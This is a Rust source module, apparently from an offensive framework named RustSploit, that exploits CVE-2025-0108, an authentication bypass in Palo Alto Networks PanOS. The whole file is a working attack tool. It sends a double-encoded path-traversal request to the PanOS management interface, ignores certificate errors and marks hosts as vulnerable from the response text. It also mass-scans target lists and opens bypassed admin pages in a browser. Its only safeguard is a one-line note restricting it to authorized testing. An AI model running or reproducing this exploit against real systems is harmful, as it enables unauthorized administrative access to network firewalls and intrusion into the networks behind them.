//! PanOS Authentication Bypass - CVE-2025-0108
//!
//! This module exploits an authentication bypass vulnerability in Palo Alto Networks
//! PanOS that allows unauthenticated access to administrative functions.
//!
//! ## Vulnerability Details
//! - **CVE**: CVE-2025-0108
//! - **Affected Products**: Palo Alto Networks PanOS
//! - **Attack Vector**: Path traversal in authentication mechanism
//! - **Impact**: Authentication bypass, unauthorized access
//!
//! ## Usage
//! ```bash
//! run exploit palo_alto/panos_authbypass_cve_2025_0108 <target>
//! ```
//!
//! Supports single target or file-based target list (`.txt` file).
//!
//! ## Security Notes
//! - Proper target normalization handles IPv4, IPv6, and URLs
//! - Input validation prevents injection attacks
//! - Error handling with proper context messages
//!
//! For authorized penetration testing only.
//!
//! Original Author: iSee857
//! Ported to Rust for RustSploit framework

use anyhow::{Context, Result};
use colored::*;
use crate::utils::validate_file_path;
use reqwest::Client;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    process::Command,
    time::Duration,
};
use url::Url;

/// Displays module banner
fn banner() {
    println!(
        "{}",
        r#"
    ****************************************************
    *                CVE-2025-0108                     *
    *             PanOs  身份认证绕过漏洞               *
    *                 作者: iSee857                    *
    ****************************************************
    "#
        .cyan()
    );
}

/// Reads target list from file
fn read_file(file_path: &str) -> Result<Vec<String>> {
    // Validate file path to prevent traversal attacks
    let validated_path = validate_file_path(file_path, true)
        .map_err(|e| anyhow::anyhow!("Invalid file path: {}", e))?;
    
    let file = File::open(&validated_path)
        .with_context(|| format!("Failed to open file: {}", validated_path))?;
    let reader = BufReader::new(file);
    let urls: Vec<String> = reader
        .lines()
        .filter_map(|line| {
            let line = line.ok()?;
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                None
            } else {
                Some(trimmed.to_string())
            }
        })
        .collect();
    Ok(urls)
}

/// Normalize IPv6 host with brackets
fn normalize_ipv6_host(host: &str) -> String {
    let stripped = host.trim_matches(|c| c == '[' || c == ']');
    if stripped.contains(':') {
        format!("[{}]", stripped)
    } else {
        stripped.to_string()
    }
}

/// Extract host and port from target string
fn parse_target(target: &str) -> Result<(String, u16)> {
    let target = target.trim();
    
    // Try to parse as URL first
    if let Ok(url) = Url::parse(target) {
        if let Some(host) = url.host_str() {
            let port = url.port().unwrap_or(443);
            return Ok((host.to_string(), port));
        }
    }
    
    // Handle IPv6 addresses in brackets [::1]:8080
    if target.starts_with('[') {
        if let Some(bracket_end) = target.find(']') {
            let host = target[1..bracket_end].to_string();
            let rest = &target[bracket_end + 1..];
            if rest.starts_with(':') {
                let port = rest[1..].parse::<u16>()
                    .context("Invalid port number")?;
                return Ok((host, port));
            } else if rest.is_empty() {
                return Ok((host, 443));
            }
        }
    }
    
    // Handle regular host:port or IPv4:port
    if let Some(colon_pos) = target.rfind(':') {
        // Check if it's an IPv6 address without brackets
        let before_colon = &target[..colon_pos];
        if before_colon.contains(':') {
            // It's IPv6 without brackets, default port
            return Ok((target.to_string(), 443));
        }
        
        let host = target[..colon_pos].to_string();
        let port = target[colon_pos + 1..].parse::<u16>()
            .context("Invalid port number")?;
        Ok((host, port))
    } else {
        Ok((target.to_string(), 443))
    }
}

/// Constructs the full normalized URL
fn build_url(host: &str, port: u16, proto: &str, path: &str) -> Result<String> {
    let host_normalized = normalize_ipv6_host(host);
    
    // Build URL string
    let url_str = if host_normalized.starts_with('[') {
        // IPv6 with brackets
        format!("{}[{}]:{}{}", proto, &host_normalized[1..host_normalized.len()-1], port, path)
    } else {
        // IPv4 or hostname
        format!("{}{}:{}{}", proto, host_normalized, port, path)
    };
    
    // Validate URL
    Url::parse(&url_str)
        .with_context(|| format!("Invalid URL format: {}", url_str))
        .map(|u| u.to_string())
}

/// Opens a URL in the default system browser
fn open_browser(url: &str) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        Command::new("xdg-open")
            .arg(url)
            .spawn()
            .context("Failed to open browser with xdg-open")?;
    }

    #[cfg(target_os = "windows")]
    {
        Command::new("cmd")
            .args(["/C", "start", url])
            .spawn()
            .context("Failed to open browser with cmd")?;
    }

    #[cfg(target_os = "macos")]
    {
        Command::new("open")
            .arg(url)
            .spawn()
            .context("Failed to open browser with open")?;
    }

    #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
    {
        return Err(anyhow::anyhow!("Browser opening not supported on this platform"));
    }
    
    Ok(())
}

/// Executes CVE-2025-0108 check
async fn check(host: &str, port: u16, client: &Client) -> Result<bool> {
    let protocols = ["http://", "https://"];
    let path = "/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css";

    for proto in &protocols {
        match build_url(host, port, proto, path) {
            Ok(full_url) => {
                println!("{}", format!("[*] Testing: {}", full_url).yellow());

                match client.get(&full_url).send().await {
                    Ok(res) => {
                        let status = res.status();
                        let body = res.text().await.unwrap_or_default();

                        if status.as_u16() == 200 && body.contains("Zero Touch Provisioning") {
                            println!(
                                "{}",
                                format!("[+] Find: {}:{} PanOS_CVE-2025-0108_LoginByPass!", host, port)
                                    .green()
                                    .bold()
                            );
                            println!("{}", format!("[*] Vulnerable URL: {}", full_url).cyan());
                            if let Err(e) = open_browser(&full_url) {
                                println!("{}", format!("[!] Warning: Could not open browser: {}", e).yellow());
                            }
                            return Ok(true);
                        } else {
                            println!(
                                "{}",
                                format!("[-] Not vulnerable: {}:{} - Response code: {}", host, port, status.as_u16())
                                    .red()
                            );
                        }
                    }
                    Err(e) => {
                        println!(
                            "{}",
                            format!("[-] Error connecting to {}:{} - {}", host, port, e).red()
                        );
                    }
                }
            }
            Err(e) => {
                println!(
                    "{}",
                    format!("[-] Failed to build URL for {}:{} - {}", host, port, e).red()
                );
            }
        }
    }

    Ok(false)
}

/// Main entry point for auto-dispatch system
pub async fn run(target: &str) -> Result<()> {
    banner();

    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()
        .context("Failed to create HTTP client")?;

    if target.ends_with(".txt") {
        let urls = read_file(target)?;
        if urls.is_empty() {
            return Err(anyhow::anyhow!("No URLs found in file: {}", target));
        }
        println!("{}", format!("[*] Loaded {} URLs from file", urls.len()).yellow());
        let mut vulnerable_count = 0;
        for url in urls {
            let (host, port) = parse_target(&url)?;
            if check(&host, port, &client).await? {
                vulnerable_count += 1;
            }
        }
        println!("{}", format!("[*] Scan completed. Found {} vulnerable target(s)", vulnerable_count).cyan());
    } else {
        let (host, default_port) = parse_target(target)?;
        
        let mut port_input = String::new();
        print!("{}", format!("Enter target port (default {}): ", default_port).cyan().bold());
        std::io::stdout()
            .flush()
            .context("Failed to flush stdout")?;
        std::io::stdin()
            .read_line(&mut port_input)
            .context("Failed to read port input")?;
        let port: u16 = port_input.trim().parse().unwrap_or(default_port);
        
        let _ = check(&host, port, &client).await?;
    }

    Ok(())
}
